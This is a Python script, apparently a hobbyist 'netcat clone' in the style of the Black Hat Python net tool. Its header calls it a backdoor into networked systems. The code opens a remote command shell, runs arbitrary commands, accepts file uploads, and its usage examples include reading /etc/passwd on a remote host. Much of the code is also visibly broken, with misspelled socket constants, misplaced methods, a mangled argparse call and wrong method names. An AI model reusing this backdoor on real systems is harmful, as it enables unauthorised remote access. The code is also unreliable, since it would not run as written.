####################################
# netcat clone
# AUTHOR: https://github.com/Robotic-ui

# ABOUT: reverse TCP/IP connectioon\enables low level user access to another machine via reaverse TCP connection  
# offical link/command help: https://www.varonis.com/blog/netcat-commands/
# What is netcat used for?
# Netcat functions as a back-end tool that allows for port scanning and port listening. In addition, you can transfer files 
# directly through Netcat or use it as a backdoor into other networked systems.
####################################

import argparse 
import socket
import shlex
import subprocess
import sys
import os
import textwrap
import threading 
####################################

# checks if cmd is running
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return 
    
    output = subprocess.check_output(shlex.split(cmd, stderr=subprocess.STDOUT))
    return output.decode()

####################################
# main function
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SQL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
          
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                    if response:
                        print(response)
                        buffer = input('> ')
                        buffer += '\n'
                        self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("User Terminated")
            self.socket.close()
            sys.exit()

def listen(self):
    self.socket.bind((self.socket.target, self.args.port))
    self.socket.listen(5)
    while True:
        client_socket,_= self.socket.accept()
        client_thread = threading.Thread(target=self.handle, args=(client_socket))
        client_thread.start()
####################################

####################################
# client side connection
def handle(self, client_socket):
    if self.args.execute:
        output = execute(self.args.execute)
        client_socket.send(output.encode())

    elif self.args.upload:
        file_buffer = b''
        while True:
            data = client_socket.recv(4096)
            if data:
                file_buffer += data
            else:
                break
        with open(self.args.upload, 'wb') as f:
            f.write(file_buffer)
        message = f'Saved file {self.args.upload}'
        client_socket.end(message.encode())

    elif self.args.command:
        cmd_buffer = b''
        while True:
            try:
                client_socket.send(b'BPH: #> ')
                while '\n' not in cmd_buffer.decode():
                    cmd_buffer += client_socket.recv(64)
                response = execute(cmd_buffer.decode())
                if response:
                    client_socket.send(response.encode())
                cmd_buffer = b''
            except Exception as e:
                print(f'server killed {e}')
                self.socket.close()
                sys.exit()
####################################

####################################
# help command
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='BHP Net Tool')
    
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent("""Example:
    netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
    netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file 
    netcat.py -t 192.168.1.108 -p 5555 -l -e\"cat /etc/passwd\" # execute command 
    echo 'Abc' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135 
""")
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specifed command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified ip')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
####################################

if args.listen:
    buffer = ''
else:
    buffer = sys.stdin.read()

nc = NetCat(args, buffer.encode())
nc.run()
